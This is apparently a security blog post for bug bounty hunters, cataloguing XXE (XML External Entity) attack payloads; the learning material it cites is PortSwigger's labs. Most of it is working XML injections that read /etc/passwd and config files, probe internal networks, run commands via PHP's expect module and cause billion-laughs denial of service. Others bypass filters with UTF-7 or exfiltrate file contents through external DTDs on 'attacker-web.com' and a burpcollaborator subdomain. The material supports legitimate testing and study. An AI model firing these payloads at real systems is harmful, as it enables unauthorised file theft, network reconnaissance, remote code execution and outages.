---
layout: post
title:  "XXE Attacks"
author: erik
categories: [ Web ]
image: https://user-images.githubusercontent.com/47476901/158905099-e3bd6d01-a91d-486b-8d64-db4dd55f97cd.png
beforetoc: ""
toc: false
tags: [ Web, Bug Bounty, Payloads ]
---
XXE (XML External Entity) attacks are vulnerabilities that arise in applications that parse XML input. Thanks to this an attacker could alter the XML data in the request to execute an attack.

# Table of Contents
1. [Dangers in XXE attacks](#DangersXXE)
2. [Payloads](#XXEpayloads)<br>
   2.1. [XXE to LFI](#XXEtoLFI)<br>
   2.2. [XXE to SSRF](#XXEtoSSRF)<br>
   2.3. [XXE to RCE](#XXEtoRCE)<br>
   2.4.  [XXE to DOS](#XXEtoDOS)
6. [Blind on request](#BlindXXE)
7. [Bypass XXE](#XXEBypass)
8. [Out-Of-Band](#OutOFBand)

---

### Dangers in XXE attacks <a name="DangersXXE"></a>
- **Exfiltrate critical information:**<br>
It
would be possible to obtain internal files from the server, which is dangerous.<br>
Example: 
[XXE to LFI](#XXEtoLFI)
- **Enumerate ports and domains in addresses internal to the network:**<br>
Through the requests enumerate the network.<br>
Example: 
[XXE to SSRF](#XXEtoSSRF)
- **See open ports at other external addresses:**<br>
 List ports using requests.
- **Execute code:** <br>
If the server has the PHP "expect" module, it would be possible to execute code and be able to execute commands.<br>
Example: 
[XXE to RCE](#XXEtoRCE)
- **Denial of service:**
Causes a denial of service by repeated calls in entitys functions.<br>
Example: 
[XXE a DOS](#XXEtoDOS)

---

###  XXE payloads <a name="XXEpayloads"></a>
**LFI Test** <a name="XXEtoLFI"></a><br>
View internal server files

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

**XXE a SSRF** <a name="XXEtoSSRF"></a><br>
List the local network of the server
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://192.168.0.1">]>
<foo>&xxe;</foo>
```

**XXE a RCE** <a name="XXEtoRCE"></a><br>
Abusing the expect module of php to execute commands (It is required to have this module on the server)
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
    <checkproduct>
       <productId>&xxe;</productId>
       <storeId>2</storeId>
    </checkproduct>
```
**XXE a DOS** <a name="XXEtoDOS"></a><br>
Cause a denial of service by repeatedly calling entity's functions
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
---

### XXE blind on request <a name="BlindXXE"></a>
**See if there is an XXE without it being seen in the request**

One way to identify an XML blind in a request: If the application embeds the submitted data in an XML document and then parses the document as it passes in a backend SOAP request.
We can try injecting XInclude which is a part of the XML specification that allows you to create an XML document from subdocuments..<br>
Example:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>



    POST /product/stock HTTP/1.1
    Host: domain.com
    Content-Length: 126
    
    productId=1&storeId=1
    ------------------------------
    POST /product/stock HTTP/1.1
    Host: domain.com
    Content-Length: 126
    
    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

 **This could also be used in case it is blind**
 ```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>

    POST /product/stock HTTP/1.1
    Host: domain.com
    Content-Length: 126
    
    productId=1&storeId=1
    ------------------------------
    POST /product/stock HTTP/1.1
    Host: domain.com
    Content-Length: 126
    
    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://attacker-web.com"/></foo>&storeId=1
```

**Blind XXE test (When it does not return values)**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://subdomain.burpcolaborator.net/?%xxe;">]>
<foo>&blind;</foo>
```
---
### XXE bypass <a name="XXEBypass"></a>
**XXE UTF-7**

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://attacker-web.com+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

**Access Control bypass (loading sensitive data)**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY load SYSTEM "php://filter/read=convert.base64-encode/resource=http://vulnerable-web.com/config.php">]>
<foo><result>&load;</result></foo>
```

---

### XXE Out-Of-Band: <a name="OutOFBand"></a>

**EXAMPLE 1**
- It is injected into the value &xxe; in one of the xml values that are sent.

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker-web.com"> ]>
```

**EXAMPLE 2**
- Payload that we will include completely in the xml value that is sent. It will make a request to the attacker's website, so we can know if it really processes the information we send it.

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com"> %xxe; ]>
```

**EXAMPLE 3**
- Code from http://attacker-web.com/cositas.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://subdomain.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate; 
```

- XML injection before the values of the page, it will inject the code of cositas.dtd in the page

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com/cositas.dtd"> %xxe;]>
```

**EXAMPLE 4**
- XXE BLIND based on error message
- Code from http://attacker-web.com/cositas.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///notexist/%file;'>">
%eval;
%error;
```

- XML injection in the page, it will inject the code of cositas.dtd

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com/cositas.dtd"> %xxe;]>
```

**EXAMPLE 5**
- Exploiting an XXE by abusing the system's DTD files, in the file it calls ISOamso, we will use that variable to exploit the XXE by creating a custom xml that performs the function of calling the /etc/passwd file that is the target.

```xml
<!DOCTYPE foo [
<!ENTITY % el_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; variable "
      <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///notexist/&#x25;file;&#x27;>
  ">
  &#x25;variable;
  &#x25;error;
'>%el_dtd;]>
```

---

- Source Labs: [Portswigger Labs](https://portswigger.net/web-security)
- Credits Image: [cobalt.io](https://www.cobalt.io)
